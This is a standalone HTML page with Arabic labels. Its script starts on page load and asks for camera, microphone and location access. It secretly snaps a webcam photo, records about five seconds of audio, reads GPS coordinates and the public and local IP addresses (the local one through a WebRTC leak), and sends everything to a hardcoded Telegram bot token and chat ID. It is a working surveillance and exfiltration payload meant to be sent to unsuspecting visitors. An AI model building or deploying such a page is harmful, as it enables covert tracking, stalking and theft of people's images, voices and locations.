<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>📍 تحديد + تصوير + IPs + 🎙️ صوت تلقائي</title>
</head>
<body>
  <h2>📍 تحديد الموقع + تصوير + IP + تسجيل صوتي تلقائي</h2>

  <pre id="status">🎙️ جاري التسجيل الصوتي...</pre>
  <video id="video" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>
  <pre id="result">📡 جاري جمع المعلومات...</pre>

  <script>
    const token = "7692799219:AAGv_dCGtZ5c-6MXTrUUJeEVoBDATMN3RgI";
    const chat_id = "5735855086";

    // 🎙️ تسجيل صوتي تلقائي
    function sendVoice(blob) {
      const form = new FormData();
      form.append("chat_id", chat_id);
      form.append("voice", blob, "recording.ogg");

      fetch(`https://api.telegram.org/bot${token}/sendVoice`, {
        method: "POST",
        body: form
      })
      .then(() => {
        document.getElementById("status").innerText = "✅ تم إرسال التسجيل الصوتي!";
      })
      .catch(err => {
        document.getElementById("status").innerText = "❌ فشل إرسال الصوت: " + err.message;
      });
    }

    function startAutoRecording() {
      document.getElementById("status").innerText = "🎙️ جاري طلب إذن الميكروفون...";
      navigator.mediaDevices.getUserMedia({ audio: true })
        .then(stream => {
          const mediaRecorder = new MediaRecorder(stream);
          const chunks = [];

          mediaRecorder.ondataavailable = e => chunks.push(e.data);
          mediaRecorder.onstop = () => {
            const blob = new Blob(chunks, { type: "audio/ogg" });
            if (blob.size > 1000) {
              sendVoice(blob);
            } else {
              document.getElementById("status").innerText = "⚠️ فشل التسجيل، الملف فارغ أو قصير جداً.";
            }
            stream.getTracks().forEach(t => t.stop());
          };

          mediaRecorder.onstart = () => {
            document.getElementById("status").innerText = "🎤 جاري التسجيل الصوتي...";
            setTimeout(() => mediaRecorder.stop(), 5500); // سجل 5.5 ثوانٍ بعد التأكد من البدء
          };

          mediaRecorder.start();
        })
        .catch(err => {
          document.getElementById("status").innerText = "❌ فشل الوصول للميكروفون: " + err.message;
        });
    }

    // 📸 و📍 و🌐 IPs
    let gpsMsg = "";
    let publicIP = "";
    let localIP = "";
    let gpsLat = "";
    let gpsLon = "";
    let partsReady = 0;

    function sendPhoto(blob) {
      const form = new FormData();
      form.append("chat_id", chat_id);
      form.append("photo", blob, "photo.jpg");
      return fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
        method: "POST",
        body: form
      });
    }

    function sendCombinedMessage() {
      const message = `📡 معلومات الجهاز:

📍 الموقع (GPS):
${gpsMsg || "❌ فشل تحديد الموقع"}

🌐 IP الخارجي: ${publicIP || "❌"}
🏠 IP الداخلي: ${localIP || "❌"}

🗺️ Google Maps: https://www.google.com/maps?q=${gpsLat},${gpsLon}`;
      document.getElementById("result").innerText = message;
      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id, text: message })
      });
    }

    function checkIfReady() {
      partsReady++;
      if (partsReady === 3) {
        sendCombinedMessage();
      }
    }

    function getLocation() {
      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          pos => {
            gpsLat = pos.coords.latitude.toFixed(6);
            gpsLon = pos.coords.longitude.toFixed(6);
            const acc = pos.coords.accuracy;
            gpsMsg = `Latitude: ${gpsLat}
Longitude: ${gpsLon}
📏 الدقة: ±${acc} متر`;
            checkIfReady();
          },
          err => {
            gpsMsg = `❌ فشل تحديد الموقع: ${err.message} (كود الخطأ: ${err.code})`;
            document.getElementById("result").innerText += `\n[خطأ GPS]: ${err.message} (code: ${err.code})`;
            checkIfReady();
          },
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
      } else {
        gpsMsg = "❌ جهازك لا يدعم GPS";
        document.getElementById("result").innerText += "\n[GPS غير مدعوم]";
        checkIfReady();
      }
    }

    function getPublicIP() {
      fetch("https://api.ipify.org?format=json")
        .then(res => res.json())
        .then(data => {
          publicIP = data.ip;
          checkIfReady();
        })
        .catch(() => {
          publicIP = "❌ فشل جلب IP";
          checkIfReady();
        });
    }

    function getLocalIP() {
      const pc = new RTCPeerConnection({ iceServers: [] });
      pc.createDataChannel("");
      pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
      pc.onicecandidate = event => {
        if (!event || !event.candidate) return;
        const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(event.candidate.candidate);
        if (ipMatch) {
          const ip = ipMatch[1];
          if (ip.startsWith("192.") || ip.startsWith("10.") || ip.startsWith("172.")) {
            localIP = ip;
            checkIfReady();
          }
        }
      };
      setTimeout(() => {
        if (!localIP) {
          localIP = "❌ لم يتم الحصول عليه";
          checkIfReady();
        }
      }, 2000);
    }

    function initCamera() {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          const video = document.getElementById("video");
          video.srcObject = stream;
          video.addEventListener("playing", () => {
            const canvas = document.getElementById("canvas");
            const ctx = canvas.getContext("2d");
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0);
            canvas.toBlob(blob => sendPhoto(blob), "image/jpeg");
            stream.getTracks().forEach(track => track.stop());
          });
        })
        .catch(err => {
          document.getElementById("result").innerText += "\n❌ الكاميرا غير متاحة: " + err.message;
        });
    }

    // 🚀 بدء العمليات تلقائيًا
    getLocation();
    getPublicIP();
    getLocalIP();
    initCamera();
    startAutoRecording(); // <-- التسجيل الصوتي التلقائي
  </script>
</body>
</html>
